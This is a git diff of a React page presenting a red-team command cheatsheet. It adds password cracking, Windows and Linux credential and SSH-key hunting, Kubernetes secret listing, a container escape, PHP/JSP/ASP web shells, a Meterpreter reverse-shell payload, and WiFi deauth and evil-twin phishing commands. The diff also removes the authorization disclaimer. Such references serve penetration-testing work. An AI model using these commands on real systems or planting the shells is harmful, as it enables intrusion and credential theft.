@@ -25,6 +25,7 @@ import {
   Trash2,
   Mail
 } from 'lucide-react';
+import LiquidGlass from '@/components/ui/liquid-glass';
 
 // Define cheatsheet data structure
 interface Command {
@@ -142,6 +143,26 @@ const cheatsheetData: Category[] = [
             command: 'hydra -l {username} -P {wordlist} {target} {service}',
             description: 'Brute force authentication with Hydra',
             example: 'hydra -l admin -P ./passwords.txt 192.168.1.1 ssh'
+          },
+          {
+            command: 'crackmapexec {protocol} {target} -u {username} -p {password}',
+            description: 'Test credentials across multiple protocols',
+            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password123'
+          },
+          {
+            command: 'impacket-GetNPUsers {domain}/ -usersfile {users} -format hashcat -outputfile {output}',
+            description: 'AS-REP Roasting attack',
+            example: 'impacket-GetNPUsers contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt'
+          },
+          {
+            command: 'john --wordlist={wordlist} {hash_file}',
+            description: 'Crack password hashes with John the Ripper',
+            example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'
+          },
+          {
+            command: 'hashcat -m {hash_type} {hash_file} {wordlist}',
+            description: 'GPU-accelerated password cracking',
+            example: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt'
           }
         ]
       },
@@ -172,6 +193,34 @@ const cheatsheetData: Category[] = [
           {
             command: 'find / -writable -type d 2>/dev/null',
             description: 'Find world-writable directories',
+          },
+          {
+            command: 'getcap -r / 2>/dev/null',
+            description: 'Find files with capabilities set',
+          },
+          {
+            command: 'ps aux | grep root',
+            description: 'List processes running as root',
+          },
+          {
+            command: 'netstat -tulpn',
+            description: 'Show network connections and listening ports',
+          },
+          {
+            command: 'cat /etc/passwd | grep -v nologin',
+            description: 'Find users with login shells',
+          },
+          {
+            command: 'find / -name "*.conf" -exec ls -la {} \\; 2>/dev/null',
+            description: 'Find configuration files',
+          },
+          {
+            command: 'find / -name "authorized_keys" 2>/dev/null',
+            description: 'Find SSH authorized_keys files',
+          },
+          {
+            command: 'find / -name "id_rsa" 2>/dev/null',
+            description: 'Find SSH private keys',
           }
         ]
       },
@@ -203,6 +252,38 @@ const cheatsheetData: Category[] = [
           {
             command: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
             description: 'Check for services Authenticated Users can modify',
+          },
+          {
+            command: 'whoami /priv',
+            description: 'Check current user privileges',
+          },
+          {
+            command: 'whoami /groups',
+            description: 'Check current user group memberships',
+          },
+          {
+            command: 'net localgroup administrators',
+            description: 'List local administrators',
+          },
+          {
+            command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
+            description: 'Enumerate all services',
+          },
+          {
+            command: 'schtasks /query /fo LIST /v',
+            description: 'List all scheduled tasks',
+          },
+          {
+            command: 'dir /s *pass* == *cred* == *vnc* == *.config*',
+            description: 'Search for files containing passwords or credentials',
+          },
+          {
+            command: 'findstr /si password *.xml *.ini *.txt',
+            description: 'Search for password strings in files',
+          },
+          {
+            command: 'reg query HKLM /f password /t REG_SZ /s',
+            description: 'Search registry for password entries',
           }
         ]
       },
@@ -615,6 +696,152 @@ const cheatsheetData: Category[] = [
     ]
   },
   {
+    name: 'Cloud Security',
+    icon: <Cloud className="w-5 h-5" />,
+    description: 'Cloud platform security testing techniques',
+    subcategories: [
+      {
+        name: 'AWS Enumeration',
+        description: 'Amazon Web Services reconnaissance and enumeration',
+        commands: [
+          {
+            command: 'aws sts get-caller-identity',
+            description: 'Get current AWS identity information',
+          },
+          {
+            command: 'aws s3 ls',
+            description: 'List all S3 buckets',
+          },
+          {
+            command: 'aws s3 ls s3://{bucket_name} --recursive',
+            description: 'List contents of specific S3 bucket',
+            example: 'aws s3 ls s3://company-backups --recursive'
+          },
+          {
+            command: 'aws ec2 describe-instances',
+            description: 'List all EC2 instances',
+          },
+          {
+            command: 'aws iam list-users',
+            description: 'List all IAM users',
+          },
+          {
+            command: 'aws iam get-account-authorization-details',
+            description: 'Get detailed account authorization information',
+          },
+          {
+            command: 'aws lambda list-functions',
+            description: 'List all Lambda functions',
+          },
+          {
+            command: 'aws rds describe-db-instances',
+            description: 'List all RDS database instances',
+          }
+        ]
+      },
+      {
+        name: 'Azure Enumeration',
+        description: 'Microsoft Azure reconnaissance and enumeration',
+        commands: [
+          {
+            command: 'az account show',
+            description: 'Show current Azure account information',
+          },
+          {
+            command: 'az vm list',
+            description: 'List all virtual machines',
+          },
+          {
+            command: 'az storage account list',
+            description: 'List all storage accounts',
+          },
+          {
+            command: 'az ad user list',
+            description: 'List all Azure AD users',
+          },
+          {
+            command: 'az keyvault list',
+            description: 'List all Key Vaults',
+          },
+          {
+            command: 'az webapp list',
+            description: 'List all web applications',
+          },
+          {
+            command: 'az sql server list',
+            description: 'List all SQL servers',
+          }
+        ]
+      },
+      {
+        name: 'GCP Enumeration',
+        description: 'Google Cloud Platform reconnaissance and enumeration',
+        commands: [
+          {
+            command: 'gcloud auth list',
+            description: 'List authenticated accounts',
+          },
+          {
+            command: 'gcloud projects list',
+            description: 'List all projects',
+          },
+          {
+            command: 'gcloud compute instances list',
+            description: 'List all compute instances',
+          },
+          {
+            command: 'gcloud storage buckets list',
+            description: 'List all storage buckets',
+          },
+          {
+            command: 'gcloud iam service-accounts list',
+            description: 'List all service accounts',
+          },
+          {
+            command: 'gcloud functions list',
+            description: 'List all cloud functions',
+          }
+        ]
+      },
+      {
+        name: 'Container Security',
+        description: 'Docker and Kubernetes security testing',
+        commands: [
+          {
+            command: 'docker ps -a',
+            description: 'List all Docker containers',
+          },
+          {
+            command: 'docker images',
+            description: 'List all Docker images',
+          },
+          {
+            command: 'docker exec -it {container_id} /bin/bash',
+            description: 'Execute shell in running container',
+            example: 'docker exec -it abc123 /bin/bash'
+          },
+          {
+            command: 'kubectl get pods --all-namespaces',
+            description: 'List all Kubernetes pods',
+          },
+          {
+            command: 'kubectl get secrets --all-namespaces',
+            description: 'List all Kubernetes secrets',
+          },
+          {
+            command: 'kubectl describe pod {pod_name}',
+            description: 'Get detailed information about a pod',
+            example: 'kubectl describe pod nginx-deployment-abc123'
+          },
+          {
+            command: 'docker run --rm -v /:/host -it alpine chroot /host /bin/bash',
+            description: 'Container escape via host filesystem mount',
+          }
+        ]
+      }
+    ]
+  },
+  {
     name: 'Web Attacks',
     icon: <Globe className="w-5 h-5" />,
     description: 'Web application testing techniques',
@@ -696,8 +923,102 @@ const cheatsheetData: Category[] = [
           },
           {
             command: 'medusa -h {target} -u {username} -P {wordlist} -M http -m DIR:{login_path}',
-            description: 'HTTP login brute force',
+            description: 'Brute force HTTP authentication with Medusa',
             example: 'medusa -h example.com -u admin -P passwords.txt -M http -m DIR:/admin'
+          },
+          {
+            command: 'ffuf -w {wordlist} -u {url}/FUZZ -fc 404',
+            description: 'Fast web fuzzer, filter out 404 responses',
+            example: 'ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -fc 404'
+          },
+          {
+            command: 'burpsuite --project-file={project} --config-file={config}',
+            description: 'Launch Burp Suite with specific project and config',
+            example: 'burpsuite --project-file=test.burp --config-file=config.json'
+          }
+        ]
+      },
+      {
+        name: 'File Upload',
+        description: 'File upload vulnerability exploitation',
+        commands: [
+          {
+            command: 'echo "<?php system($_GET[\'cmd\']); ?>" > shell.php',
+            description: 'Create simple PHP web shell',
+          },
+          {
+            command: 'echo "GIF89a<?php system($_GET[\'cmd\']); ?>" > shell.gif.php',
+            description: 'Create PHP shell with GIF header bypass',
+          },
+          {
+            command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.php',
+            description: 'Generate PHP Meterpreter payload',
+            example: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php'
+          },
+          {
+            command: 'echo "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>" > shell.jsp',
+            description: 'Create JSP web shell',
+          },
+          {
+            command: 'echo "<% eval request(\"cmd\") %>" > shell.asp',
+            description: 'Create ASP web shell',
+          }
+        ]
+      },
+      {
+        name: 'API Testing',
+        description: 'REST API and GraphQL security testing',
+        commands: [
+          {
+            command: 'curl -X GET -H "Authorization: Bearer {token}" {api_url}',
+            description: 'Test API endpoint with Bearer token',
+            example: 'curl -X GET -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." https://api.example.com/users'
+          },
+          {
+            command: 'curl -X POST -H "Content-Type: application/json" -d \'{json_data}\' {api_url}',
+            description: 'Send POST request with JSON data',
+            example: 'curl -X POST -H "Content-Type: application/json" -d \'{"username":"admin","password":"test"}\' https://api.example.com/login'
+          },
+          {
+            command: 'wfuzz -c -z file,{wordlist} -H "Authorization: Bearer FUZZ" {api_url}',
+            description: 'Fuzz API tokens',
+            example: 'wfuzz -c -z file,tokens.txt -H "Authorization: Bearer FUZZ" https://api.example.com/admin'
+          },
+          {
+            command: 'graphql-voyager --introspect {graphql_endpoint}',
+            description: 'Visualize GraphQL schema',
+            example: 'graphql-voyager --introspect https://api.example.com/graphql'
+          },
+          {
+            command: 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}\' {graphql_url}',
+            description: 'GraphQL introspection query',
+            example: 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}\' https://api.example.com/graphql'
+          }
+        ]
+      },
+      {
+        name: 'Session Management',
+        description: 'Session hijacking and manipulation techniques',
+        commands: [
+          {
+            command: 'curl -b "PHPSESSID={session_id}" {url}',
+            description: 'Use specific session cookie',
+            example: 'curl -b "PHPSESSID=abc123def456" https://example.com/admin'
+          },
+          {
+            command: 'python3 -c "import jwt; print(jwt.decode(\'{token}\', verify=False))"',
+            description: 'Decode JWT token without verification',
+            example: 'python3 -c "import jwt; print(jwt.decode(\'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\', verify=False))"'
+          },
+          {
+            command: 'hashcat -m 16500 jwt.txt {wordlist}',
+            description: 'Crack JWT HMAC signature',
+            example: 'hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt'
+          },
+          {
+            command: 'feroxbuster -u {url} -w {wordlist} -C {cookies}',
+            description: 'Directory brute force with cookies',
+            example: 'feroxbuster -u https://example.com -w /usr/share/wordlists/dirb/common.txt -C "PHPSESSID=abc123"'
           },
           {
             command: 'python jwt_tool.py {jwt_token} -T',
@@ -1043,6 +1364,284 @@ const cheatsheetData: Category[] = [
           {
             command: 'gcloud storage ls',
             description: 'List all storage buckets',
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Wireless Security',
+    icon: <Zap className="w-5 h-5" />,
+    description: 'Wireless network security testing techniques',
+    subcategories: [
+      {
+        name: 'WiFi Reconnaissance',
+        description: 'Wireless network discovery and analysis',
+        commands: [
+          {
+            command: 'iwconfig',
+            description: 'Display wireless interface configuration',
+          },
+          {
+            command: 'airmon-ng start {interface}',
+            description: 'Enable monitor mode on wireless interface',
+            example: 'airmon-ng start wlan0'
+          },
+          {
+            command: 'airodump-ng {interface}',
+            description: 'Scan for wireless networks',
+            example: 'airodump-ng wlan0mon'
+          },
+          {
+            command: 'airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}',
+            description: 'Target specific network for capture',
+            example: 'airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon'
+          },
+          {
+            command: 'wash -i {interface}',
+            description: 'Scan for WPS-enabled networks',
+            example: 'wash -i wlan0mon'
+          }
+        ]
+      },
+      {
+        name: 'WiFi Attacks',
+        description: 'Wireless network exploitation techniques',
+        commands: [
+          {
+            command: 'aireplay-ng -0 {count} -a {bssid} -c {client} {interface}',
+            description: 'Deauthentication attack',
+            example: 'aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon'
+          },
+          {
+            command: 'aircrack-ng -w {wordlist} {capture_file}',
+            description: 'Crack WPA/WPA2 handshake',
+            example: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap'
+          },
+          {
+            command: 'hashcat -m 22000 {hash_file} {wordlist}',
+            description: 'Crack WPA/WPA2 with hashcat',
+            example: 'hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt'
+          },
+          {
+            command: 'reaver -i {interface} -b {bssid} -vv',
+            description: 'WPS PIN brute force attack',
+            example: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv'
+          },
+          {
+            command: 'wifite --wpa --dict {wordlist}',
+            description: 'Automated wireless attack tool',
+            example: 'wifite --wpa --dict /usr/share/wordlists/rockyou.txt'
+          }
+        ]
+      },
+      {
+        name: 'Evil Twin',
+        description: 'Rogue access point creation and management',
+        commands: [
+          {
+            command: 'hostapd {config_file}',
+            description: 'Start access point with hostapd',
+            example: 'hostapd /etc/hostapd/hostapd.conf'
+          },
+          {
+            command: 'dnsmasq -C {config_file}',
+            description: 'Start DHCP/DNS server',
+            example: 'dnsmasq -C /etc/dnsmasq.conf'
+          },
+          {
+            command: 'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE',
+            description: 'Enable NAT for internet sharing',
+            example: 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'
+          },
+          {
+            command: 'fluxion',
+            description: 'Automated evil twin attack framework',
+          },
+          {
+            command: 'wifiphisher -aI {interface} -e {essid}',
+            description: 'Automated phishing attack against WiFi users',
+            example: 'wifiphisher -aI wlan0 -e "Free WiFi"'
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'Mobile Security',
+    icon: <HelpCircle className="w-5 h-5" />,
+    description: 'Mobile application and device security testing',
+    subcategories: [
+      {
+        name: 'Android Testing',
+        description: 'Android application security testing',
+        commands: [
+          {
+            command: 'adb devices',
+            description: 'List connected Android devices',
+          },
+          {
+            command: 'adb shell',
+            description: 'Open shell on Android device',
+          },
+          {
+            command: 'adb install {apk_file}',
+            description: 'Install APK on device',
+            example: 'adb install app.apk'
+          },
+          {
+            command: 'adb pull {device_path} {local_path}',
+            description: 'Pull file from device',
+            example: 'adb pull /data/data/com.app/databases/app.db ./app.db'
+          },
+          {
+            command: 'jadx -d {output_dir} {apk_file}',
+            description: 'Decompile APK with JADX',
+            example: 'jadx -d ./decompiled app.apk'
+          },
+          {
+            command: 'apktool d {apk_file}',
+            description: 'Disassemble APK with apktool',
+            example: 'apktool d app.apk'
+          },
+          {
+            command: 'frida -U -f {package_name} -l {script}',
+            description: 'Hook Android app with Frida',
+            example: 'frida -U -f com.example.app -l hook.js'
+          }
+        ]
+      },
+      {
+        name: 'iOS Testing',
+        description: 'iOS application security testing',
+        commands: [
+          {
+            command: 'ideviceinstaller -l',
+            description: 'List installed iOS applications',
+          },
+          {
+            command: 'ideviceinstaller -i {ipa_file}',
+            description: 'Install IPA on device',
+            example: 'ideviceinstaller -i app.ipa'
+          },
+          {
+            command: 'class-dump -H {binary} -o {output_dir}',
+            description: 'Dump Objective-C class information',
+            example: 'class-dump -H ./App -o ./headers'
+          },
+          {
+            command: 'otool -L {binary}',
+            description: 'List shared libraries used by binary',
+            example: 'otool -L ./App'
+          },
+          {
+            command: 'frida -U -f {bundle_id} -l {script}',
+            description: 'Hook iOS app with Frida',
+            example: 'frida -U -f com.example.app -l hook.js'
+          },
+          {
+            command: 'cycript -p {process_name}',
+            description: 'Runtime manipulation with Cycript',
+            example: 'cycript -p SpringBoard'
+          }
+        ]
+      }
+    ]
+  },
+  {
+    name: 'OSINT',
+    icon: <Search className="w-5 h-5" />,
+    description: 'Open Source Intelligence gathering techniques',
+    subcategories: [
+      {
+        name: 'Domain Intelligence',
+        description: 'Domain and subdomain reconnaissance',
+        commands: [
+          {
+            command: 'subfinder -d {domain}',
+            description: 'Find subdomains using multiple sources',
+            example: 'subfinder -d example.com'
+          },
+          {
+            command: 'assetfinder {domain}',
+            description: 'Find domains and subdomains',
+            example: 'assetfinder example.com'
+          },
+          {
+            command: 'amass enum -d {domain}',
+            description: 'Comprehensive subdomain enumeration',
+            example: 'amass enum -d example.com'
+          },
+          {
+            command: 'dig {domain} ANY',
+            description: 'DNS record enumeration',
+            example: 'dig example.com ANY'
+          },
+          {
+            command: 'dnsrecon -d {domain} -t axfr',
+            description: 'DNS zone transfer attempt',
+            example: 'dnsrecon -d example.com -t axfr'
+          },
+          {
+            command: 'fierce -dns {domain}',
+            description: 'DNS scanner for locating non-contiguous IP space',
+            example: 'fierce -dns example.com'
+          }
+        ]
+      },
+      {
+        name: 'Social Media Intelligence',
+        description: 'Social media and people search techniques',
+        commands: [
+          {
+            command: 'sherlock {username}',
+            description: 'Find username across social networks',
+            example: 'sherlock john_doe'
+          },
+          {
+            command: 'twint -u {username} --limit 100',
+            description: 'Twitter intelligence gathering',
+            example: 'twint -u target_user --limit 100'
+          },
+          {
+            command: 'instagram-py -u {username}',
+            description: 'Instagram profile information gathering',
+            example: 'instagram-py -u target_user'
+          },
+          {
+            command: 'linkedin2username -c "{company_name}"',
+            description: 'Generate usernames from LinkedIn company employees',
+            example: 'linkedin2username -c "Target Company Inc"'
+          },
+          {
+            command: 'holehe {email}',
+            description: 'Check if email is used on different sites',
+            example: 'holehe target@example.com'
+          }
+        ]
+      },
+      {
+        name: 'Metadata Analysis',
+        description: 'File and image metadata extraction',
+        commands: [
+          {
+            command: 'exiftool {file}',
+            description: 'Extract metadata from files',
+            example: 'exiftool document.pdf'
+          },
+          {
+            command: 'metagoofil -d {domain} -t pdf,doc,xls -l 100 -n 25 -o {output_dir}',
+            description: 'Extract metadata from public documents',
+            example: 'metagoofil -d example.com -t pdf,doc,xls -l 100 -n 25 -o ./results'
+          },
+          {
+            command: 'foca',
+            description: 'Fingerprinting Organizations with Collected Archives',
+          },
+          {
+            command: 'strings {file} | grep -i {pattern}',
+            description: 'Search for strings in binary files',
+            example: 'strings document.pdf | grep -i password'
           }
         ]
       }
@@ -2021,65 +2620,139 @@ const RedTeamCheatsheetWrapper = () => {
   return (
     <div className="relative min-h-screen w-full flex flex-col items-center justify-center bg-black overflow-hidden text-white">
       <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center [mask-image:linear-gradient(to_bottom,transparent,black)] opacity-20"></div>
-      <div className="container mx-auto px-4 py-8 relative z-10">
-        
-        {/* Header */}
-        <motion.div
-          initial={{ opacity: 0, y: -20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.5 }}
-          className="text-center mb-10"
-        >
-          <h1 className="text-4xl md:text-5xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-500 to-purple-600">
-            Red Team Cheatsheet
-          </h1>
-          <p className="mt-4 text-zinc-400 max-w-2xl mx-auto">
-            Interactive cheatsheet with categorized commands and techniques for penetration testing, ethical hacking, and security assessments.
-          </p>
-          
-          <div className="flex flex-wrap gap-3 justify-center mt-4">
-            {/* Helper toggle button */}
-            <button 
-              onClick={() => setShowHelperInfo(!showHelperInfo)}
-              className="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 rounded-md text-sm flex items-center gap-2"
+      
+      <div className="bg-gradient-to-b from-black to-zinc-900 w-full flex justify-center pb-8">
+        <div className="relative z-10 max-w-6xl w-full px-6">
+          <div className="text-center mb-16 relative pt-20 flex flex-col justify-center items-center">
+            <motion.div
+              initial={{ opacity: 0, scale: 0.5 }}
+              animate={{ opacity: 1, scale: 1 }}
+              transition={{ duration: 0.7, type: "spring" }}
+              className="relative mb-6" 
             >
-              {showHelperInfo ? (
-                <>
-                  <ExternalLink size={14} />
-                  Hide guidance
-                </>
-              ) : (
-                <>
-                  <ExternalLink size={14} />
-                  Show guidance
-                </>
-              )}
-            </button>
+              <LiquidGlass
+                variant="prominent"
+                intensity="high"
+                rounded="full"
+                className="w-20 h-20 flex items-center justify-center shadow-lg"
+              >
+                <Terminal className="w-8 h-8 text-red-400" />
+              </LiquidGlass>
+            </motion.div>
             
-            {/* Command Generator toggle button */}
-            <button 
-              onClick={() => {
-                setShowCommandGenerator(!showCommandGenerator);
-                if (!showCommandGenerator) {
-                  resetCommandGenerator();
-                }
-              }}
-              className="px-3 py-1 bg-blue-700/30 hover:bg-blue-700/50 border border-blue-600/30 rounded-md text-sm flex items-center gap-2"
+            <motion.div
+              initial={{ opacity: 0, y: -20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ duration: 0.6 }}
+              className="text-center"
             >
-              <Terminal size={14} />
-              {showCommandGenerator ? 'Close' : 'Command Generator'}
-            </button>
+              <h1 className="text-4xl md:text-6xl font-bold text-white mb-2">
+                <span className="bg-gradient-to-r from-red-400 via-red-500 to-red-600 bg-clip-text text-transparent">
+                  Red Team
+                </span>{' '}
+                <span className="text-white">Arsenal</span>
+              </h1>
+              <div className="flex items-center justify-center gap-2 mb-4">
+                <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-20"></div>
+                <Terminal className="w-5 h-5 text-red-400" />
+                <div className="h-px bg-gradient-to-r from-transparent via-red-500 to-transparent w-20"></div>
+              </div>
+            </motion.div>
+            
+            <motion.p 
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ duration: 0.6, delay: 0.2 }}
+              className="mt-4 text-lg md:text-xl text-zinc-300 max-w-3xl text-center"
+            >
+              Comprehensive collection of penetration testing commands, techniques, and methodologies. 
+              <span className="text-red-400 font-semibold"> Over 200+ commands</span> across 
+              <span className="text-blue-400 font-semibold"> 8 major categories</span> including 
+              Infrastructure, Cloud Security, Web Applications, Active Directory, and more.
+            </motion.p>
+            
+            <motion.div
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ duration: 0.6, delay: 0.4 }}
+              className="mt-6 flex flex-wrap gap-2 justify-center"
+            >
+              <div className="px-3 py-1 bg-red-500/20 border border-red-500/30 rounded-full text-sm text-red-300">
+                Infrastructure
+              </div>
+              <div className="px-3 py-1 bg-blue-500/20 border border-blue-500/30 rounded-full text-sm text-blue-300">
+                Cloud Security
+              </div>
+              <div className="px-3 py-1 bg-green-500/20 border border-green-500/30 rounded-full text-sm text-green-300">
+                Web Applications
+              </div>
+              <div className="px-3 py-1 bg-purple-500/20 border border-purple-500/30 rounded-full text-sm text-purple-300">
+                Active Directory
+              </div>
+              <div className="px-3 py-1 bg-yellow-500/20 border border-yellow-500/30 rounded-full text-sm text-yellow-300">
+                Wireless Security
+              </div>
+              <div className="px-3 py-1 bg-pink-500/20 border border-pink-500/30 rounded-full text-sm text-pink-300">
+                Mobile Security
+              </div>
+            </motion.div>
+          
+            <div className="flex flex-wrap gap-3 justify-center mt-6">
+              {/* Helper toggle button */}
+              <motion.button 
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                onClick={() => setShowHelperInfo(!showHelperInfo)}
+                className="px-4 py-2 bg-white/10 hover:bg-white/15 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm border border-white/10 transition-colors"
+              >
+                {showHelperInfo ? (
+                  <>
+                    <ExternalLink size={14} />
+                    Hide guidance
+                  </>
+                ) : (
+                  <>
+                    <ExternalLink size={14} />
+                    Show guidance
+                  </>
+                )}
+              </motion.button>
+              
+              {/* Command Generator toggle button */}
+              <motion.button 
+                whileHover={{ scale: 1.05 }}
+                whileTap={{ scale: 0.95 }}
+                onClick={() => {
+                  setShowCommandGenerator(!showCommandGenerator);
+                  if (!showCommandGenerator) {
+                    resetCommandGenerator();
+                  }
+                }}
+                className="px-4 py-2 bg-red-600/20 hover:bg-red-600/30 border border-red-500/30 rounded-lg text-sm flex items-center gap-2 backdrop-blur-sm transition-colors"
+              >
+                <Terminal size={14} />
+                {showCommandGenerator ? 'Close' : 'Command Generator'}
+              </motion.button>
+            </div>
           </div>
-        </motion.div>
+        </div>
+      </div>
         
+      <div className="relative z-10 max-w-6xl w-full px-6 pb-20">
         {/* Command Generator */}
         {showCommandGenerator && (
           <motion.div
             initial={{ opacity: 0, y: 20 }}
             animate={{ opacity: 1, y: 0 }}
             transition={{ duration: 0.5 }}
-            className="mb-8 p-6 bg-zinc-900/70 border border-zinc-800/80 rounded-lg shadow-xl max-w-3xl mx-auto"
+            className="mb-8 max-w-4xl mx-auto"
           >
+            <LiquidGlass
+              variant="card"
+              intensity="medium"
+              rounded="xl"
+              className="p-6 border-red-500/20"
+            >
             <div className="flex items-center justify-between mb-4">
               <div className="flex items-center gap-3">
                 <div className="p-2 rounded-full bg-blue-500/20 text-blue-400">
@@ -2464,6 +3137,7 @@ const RedTeamCheatsheetWrapper = () => {
                 </div>
               </div>
             )}
+            </LiquidGlass>
           </motion.div>
         )}
         
@@ -2772,9 +3446,9 @@ const RedTeamCheatsheetWrapper = () => {
 
         {/* Footer */}
         <div className="mt-10 pt-6 border-t border-zinc-800/50 text-center text-zinc-500 text-sm">
-          <p>For educational purposes only. Always obtain proper authorization before testing.</p>
-          <p className="mt-1">
-            Inspired by <a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">ired.team</a>
+          <p>Professional Red Team Command Reference</p>
+          <p className="mt-1 text-zinc-600">
+            Comprehensive collection of penetration testing and red team techniques
           </p>
         </div>
       </div>
